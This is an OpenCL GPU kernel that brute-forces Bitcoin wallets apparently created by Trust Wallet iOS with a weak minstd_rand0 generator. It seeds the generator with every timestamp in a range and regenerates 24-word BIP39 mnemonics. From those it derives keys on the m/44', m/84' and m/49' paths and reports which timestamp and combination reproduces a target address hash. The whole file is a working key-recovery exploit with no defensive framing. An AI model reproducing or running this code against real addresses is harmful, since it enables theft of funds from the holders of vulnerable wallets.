// Trust Wallet iOS — LCG/minstd_rand0 scanner — 256-bit entropy (24-word mnemonic)
//
// Identical PRNG and combo logic as trust_wallet_lcg_crack.cl,
// but generates 32 bytes of entropy (256 bits) instead of 16,
// producing a 24-word BIP39 mnemonic.
//
// Two entropy strategies × three derivation paths = 6 combos:
//   combo 0: VariantAnd + m/44'  (P2PKH)
//   combo 1: VariantMod + m/44'  (P2PKH)
//   combo 2: VariantAnd + m/84'  (P2WPKH)
//   combo 3: VariantMod + m/84'  (P2WPKH)
//   combo 4: VariantAnd + m/49'  (P2SH-P2WPKH)
//   combo 5: VariantMod + m/49'  (P2SH-P2WPKH)
//
// Global work size = 6 × (end_ts - start_ts).

static uint minstd_next_256(uint state) {
    return (uint)(((ulong)state * 16807UL) % 2147483647UL);
}

static uint minstd_seed_256(uint seed) {
    uint s = seed % 2147483647u;
    return (s == 0u) ? 1u : s;
}

static void lcg_entropy_and_256(uint seed, __private uchar entropy[32]) {
    uint s = minstd_seed_256(seed);
    for (int i = 0; i < 32; i++) {
        s = minstd_next_256(s);
        entropy[i] = (uchar)(s & 0xFFu);
    }
}

static void lcg_entropy_mod_256(uint seed, __private uchar entropy[32]) {
    uint s = minstd_seed_256(seed);
    for (int i = 0; i < 32; i++) {
        s = minstd_next_256(s);
        entropy[i] = (uchar)(s % 255u);
    }
}

__kernel void trust_wallet_lcg_crack_256(
    __global ulong* results,
    __global uint*  result_count,
    ulong  target_h160_part1,
    ulong  target_h160_part2,
    uint   target_h160_part3,
    uint   offset,
    uint   range
) {
    uint gid       = get_global_id(0);
    uint combo     = gid % 6u;
    uint ts_offset = gid / 6u;

    if (ts_offset >= range) return;

    uint timestamp = ts_offset + offset;

    uchar entropy[32];
    if ((combo & 1u) == 0u)
        lcg_entropy_and_256(timestamp, entropy);
    else
        lcg_entropy_mod_256(timestamp, entropy);

    // BIP39: 256-bit entropy → 24-word mnemonic
    uchar mnemonic[300];
    int   mnemonic_len = 0;
    generate_mnemonic_32(entropy, mnemonic, &mnemonic_len);

    // PBKDF2-HMAC-SHA512 → 64-byte seed
    uchar salt[8] = {'m','n','e','m','o','n','i','c'};
    uchar seed[64];
    mnemonic_to_seed(mnemonic, mnemonic_len, salt, 8, seed);

    // BIP32 master key
    extended_private_key_t mk;
    new_master_from_seed(0, seed, &mk);

    uint purpose;
    if      (combo < 2u) purpose = 44u;
    else if (combo < 4u) purpose = 84u;
    else                 purpose = 49u;

    extended_private_key_t k_purpose, k_coin, k_account, k_change, k_addr;
    hardened_private_child_from_private(&mk,       &k_purpose, purpose);
    hardened_private_child_from_private(&k_purpose,&k_coin,    0u);
    hardened_private_child_from_private(&k_coin,   &k_account, 0u);
    normal_private_child_from_private  (&k_account,&k_change,  0u);
    normal_private_child_from_private  (&k_change, &k_addr,    0u);

    extended_public_key_t pub;
    public_from_private(&k_addr, &pub);

    uchar hash160[20];
    if (combo >= 4u) {
        uchar inner_h160[20];
        identifier_for_public_key(&pub, inner_h160);
        uchar witness_script[22] __attribute__((aligned(4)));
        witness_script[0] = 0x00;
        witness_script[1] = 0x14;
        for (int i = 0; i < 20; i++) witness_script[i + 2] = inner_h160[i];
        uchar sha256_result[32] __attribute__((aligned(4)));
        sha256((__private uint*)witness_script, 22, (__private uint*)sha256_result);
        ripemd160(sha256_result, 32, (__private uchar*)hash160);
    } else {
        identifier_for_public_key(&pub, hash160);
    }

    ulong h1 = 0UL, h2 = 0UL;
    uint  h3 = 0u;
    for (int i = 0; i < 8;  i++) h1 |= ((ulong)hash160[i])      << (i * 8);
    for (int i = 0; i < 8;  i++) h2 |= ((ulong)hash160[i + 8])  << (i * 8);
    for (int i = 0; i < 4;  i++) h3 |= ((uint) hash160[i + 16]) << (i * 8);

    if (h1 == target_h160_part1 && h2 == target_h160_part2 && h3 == target_h160_part3) {
        uint idx = atomic_inc(result_count);
        if (idx < 1024u)
            results[idx] = (ulong)timestamp | ((ulong)combo << 32);
    }
}
